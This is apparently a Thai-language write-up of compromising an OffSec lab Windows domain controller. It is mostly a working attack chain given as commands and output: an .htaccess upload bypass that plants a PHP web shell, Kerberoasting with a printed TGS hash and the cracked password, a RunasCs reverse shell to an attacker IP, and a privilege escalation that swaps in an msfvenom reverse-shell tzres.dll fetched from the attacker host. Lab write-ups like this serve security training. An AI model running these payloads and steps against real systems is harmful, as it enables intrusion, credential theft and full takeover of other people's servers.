# Recon 

## TCP Scan 

```bash
sudo ../tools/scan.sh 192.168.183.187
[*] Running rustscan...
[*] Running nmap on ports: 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,47001,49665,49664,49666,49668,49669,49671,49670,49674,49679,49701,49785
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 10:26 EDT
Nmap scan report for 192.168.183.187
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Access The Event
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-01 14:26:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| tls-alpn: 
|_  http/1.1
|_http-title: Access The Event
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49785/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-01T14:27:47
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.97 seconds


```


# TCP 80 

## Dir brute force 

```bash
dirsearch -u https://192.168.183.187  
```

![[Pasted image 20250701214201.png]]
## Upload shell 

เราจะสร้าง Extension ใหม่สำหรับไฟล์ php เพื่อจะ bypass การ upload ไปยัง .htaccess

```bash
echo "AddType application/x-httpd-php .ice" > .htaccess

mv shell.pHp shell.ice
```

![[Pasted image 20250701215420.png]]
## upload .htaccess
![[Pasted image 20250701213752.png]]

![[Pasted image 20250701213841.png]]

![[Pasted image 20250701213905.png]]

![[Pasted image 20250701213931.png]]


# Shell as svc_apache 

`http://192.168.183.187/Uploads/shell.ice`
![[Pasted image 20250701215549.png]]


```powershell
C:\xampp>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\xampp>


```

ข้อมูลข้างต้นทำให้เห็นว่ามีสิทธิ SeChangeNotifyPrivilege และ SeCreateGlobalPrivilege
ref: https://itm4n.github.io/localservice-privileges/?source=post_page-----b95d3146cfe9--------------------------------------- 

# Kerberosting 

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
type hashes.kerberoast


$krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$CC9DD32F61036FD332D1F5DC033009E5$5F2CD02D9D333A0128292A2CA16031D24776A90F6614B18D3E4B98394F57E98EDFC089427EE5115DB275D6A7698ECE73C6621F4EC8279B3259701577629EB792BDB50792C33A5F2C5FCE7D08F6CF3CBA64F3A76784A3E754C9C3DF553B316348AE54EECB8FA2DFA8399BBDFF720A4E117668848EA0680544C30BEA4C21BC0B5CC96567562357CD125F725F30EBD44BD958287BBCF4B255D1360B5B08E0432B3FD1323120CA367C99A2AEB851D7F7681CD3466FD39E975CB604EB35CAC885D4DE6876BBAD51CF297005E0F129789558680BB51786D088261425AAF5DF17B36D17768F874F93B1076BD4C107ED1B63337A9F0E56F25AE07F5C329C223975DD6DBA9966EBA326AA7D2E32EC8E8CFF0B25D9144C3284F2B34202626D1CE2A3EF2B09F11ADFDAD7370606B327393906EDEB4CBF93B8F54A37A2F7BDEE5702A306DD3AFEE3D817C602D56A1C1E3360203A14BBDE12F6BF8BC3344EAADA3220783EE745C435C81F4DDFBF963B1B3FE5F78F91E261F7EEEE4E80654AD9F731BD1E20E9DB082A85ABFF5D99C25955BF8FE3F96F1A72B225F26BA3CD89CABF6255DB095C2DE1F4FC2C67D2A4AC216E0975A89AD732CDA12094CEA07B474D6E5192E9EA98DFF5E6C942EB5EDCDC289BB2E14397FA8C8BA9922B983C7AF77F74AF66A0B5AE97BF6D02B83ADF4AD832543C42FBD52D043B1B35D736927E2FAFBDA780DE3CCB9D3C46173BB200FDC592400234B7A1C90C6853E3EFB1DCDA2A8C951068D0770ECE269CD46AFFB441BD2045B77FB8945E3299786A6FC7E09CAE264DBA77D13EAA600E989B4441428A2D26323A6132730271A66170972A036DFDF5D7184349CF5E6D2084CE2A941410B5794FFD41B015221B49B764980A52E132245361CD90D6DBA05E38E51447BD87EC23B06E17077295B97793A9CD2EFE9B1A21212CFDFE94B0A9BA157E677C2F073747AE87523DEB06656A2FB20E46C1A5EFCBFA97ED4FBEAF8D54A9052325662CAB0287DED96D2C8EE0C32844373B8FEEF6641842A4CCA01A84254182EC99AB3D0DF4708BEF0BC926C778F1B76E39BFF8ECAFA1F25C56E5AB6E484518CF599968EBF6C36E3B5E0CFC9AB20655051F442DECE6D2BE82766685BBA95590B55BB0C15E66435144163E6EDC924E2C9B701F35D9620EF2B48CD19D32D174F7B2D815D88FB076FD0916D4F5CE5FEC1572F0907CEF6C3C66DB1A1BEA75BEA8BD60A0AFF7725B2E77AE7A1C82B5BC1245B024A97081387376BCF7B5AF295DEE4B82002F5D0B8B8683E0CF42C3F5A8CDF15B9E76A7C53558FD8080F6DBA07C9AA5E21FCC0BFDB840DF180D72B5AC95FF38C2A915E8A5F99963591341EE93A20B3B17576CF4B4AADB9C82884D2D1CF4C6EB1AA646799F5F3871E6238EE6B99AF435816D891E8599DF6D323B60D0AF6FF4F086437062295E8CF8615B257028B24FA7EA1A65F97C432670B51C6CD5CB7C6778AA8406EAA0F49AD6A2B657BD13AA7765A7BEA538FAE69CDB70412EC528E5D5DB9765A61C4571960D62871D1A94A2B4024844B9E1ECED584440A8676603F2E36AB79FF7A87DF29C224FBE4162B3F3CF2F3A3BD9A7F22FFEE13A5E9817529603
```


# Crack hash kerberos 

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
trustno1         (?)     
1g 0:00:00:00 DONE (2025-07-01 11:29) 100.0g/s 102400p/s 102400c/s 102400C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

svc_mssql:trustno1


# Shell as svc_mssql

source: https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1?source=post_page-----12ad7f6bad6f--------------------------------------- 

```bash
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami" 
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "cmd" -Remote 192.168.45.151:443
```


![[Pasted image 20250701225919.png]]

# SeManageVolumePrivilege Privilege Escalation 

ref: https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public?source=post_page-----12ad7f6bad6f---------------------------------------
ref: https://github.com/xct/SeManageVolumeAbuse 

**SeManageVolumePrivilege** ใน Windows เป็นสิทธิ์ที่อนุญาตให้ผู้ใช้จัดการไดรฟ์และวอลุ่มต่างๆ ได้ เช่น การฟอร์แมตไดรฟ์, การสร้างพาร์ติชันใหม่, และการกำหนดตัวอักษรไดรฟ์ แม้สิทธิ์นี้จะไม่ได้ให้สิทธิ์ผู้ดูแลระบบแบบเต็มตัวโดยตรง แต่ผู้โจมตีสามารถใช้เครื่องมือหรือเทคนิคบางอย่างเพื่อ **ยกระดับสิทธิ์ (escalate privileges)** ได้

โดยการใช้ช่องโหว่นี้ เราสามารถ **ยกระดับสิทธิ์** ได้ด้วยการ **แก้ไขสิทธิ์การเขียน** บนโฟลเดอร์ **C:\Windows\System32** ให้สามารถเขียนได้ การทำเช่นนี้ทำให้เราสามารถทำการ **DLL injection** ซึ่งอาจส่งผลให้ได้รับสิทธิ์ของระบบที่สูงขึ้นในที่สุด `.\SeManageVolumeExploit.exe`

## DLL injection

การที่เราแทรก **Dynamic Link Library (DLL)** ที่เป็นอันตรายเข้าไปใน Process ที่มีสิทธิ์สูงกว่า จะทำให้เราสามารถรันโค้ดใดๆ ก็ได้ภายในบริบทของ Process นั้นๆ หาก Process เป้าหมายกำลังทำงานในฐานะ **SYSTEM** หรือผู้ใช้ที่มีสิทธิ์สูงอื่นๆ สิ่งนี้อาจนำไปสู่การ **ยกระดับสิทธิ์ (privilege escalation)** ทำให้เราควบคุมระบบได้มากขึ้น

ด้วยการใช้เครื่องมือ **dllref** ของ Siren Security เราพบว่า **tzres.dll** มีความเชื่อมโยงกับคำสั่ง **systeminfo** โดยปกติแล้ว การรันคำสั่ง **systeminfo** จะแสดงรายละเอียดของระบบ แต่ถ้าเราแทรก **tzres.dll** ที่เป็นอันตรายเข้าไป เราก็สามารถ "ยึด" Process นั้นได้ สิ่งนี้ทำให้เราสามารถรัน **reverse shell** ซึ่งนำไปสู่การ **ยกระดับสิทธิ์** และเข้าถึงระบบในระดับที่สูงขึ้น

**tzres.dll**
- ตำแหน่ง: `C:\Windows\System32\wbem\tzres.dll`
- เกี่ยวข้องกับ: `systeminfo`
- ทำงานภายใต้บริบทของ: `NetworkService` (โดยปกติ)

ในการยกระดับสิทธิ์โดยใช้ **DLL Injection** ขั้นแรก เราต้องสร้าง **DLL** ที่เป็นอันตราย ซึ่งจะรัน Payload เมื่อถูกโหลดโดย Process เป้าหมาย Payload นี้อาจเป็น **reverse shell**, การสร้าง **ผู้ใช้ที่มีสิทธิ์สูง (privileged user)** หรือคำสั่งอื่นๆ ที่ให้สิทธิ์การเข้าถึงระดับสูงขึ้น

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.xxx LPORT=4444 -f dll -o tzres.dll
```

คำสั่งนี้จะสร้างไฟล์ `tzres.dll` ที่เป็น DLL แบบ 64-bit สำหรับ Windows ซึ่งเมื่อถูกรันจะพยายามเชื่อมต่อกลับไปยัง `192.168.45.xxx` บนพอร์ต `443` เพื่อเปิด **reverse shell**

```powershell
cd C:\Windows\System32\wbem\
iwr -uri http://192.168.45.151/tzres.dll -outfile tzres.dll
dir  tzres.dll
systeminfo
# Attacker 
nc -lvnp 4444 
```
![[Pasted image 20250701232058.png]]

![[Pasted image 20250701232032.png]]

# PWN 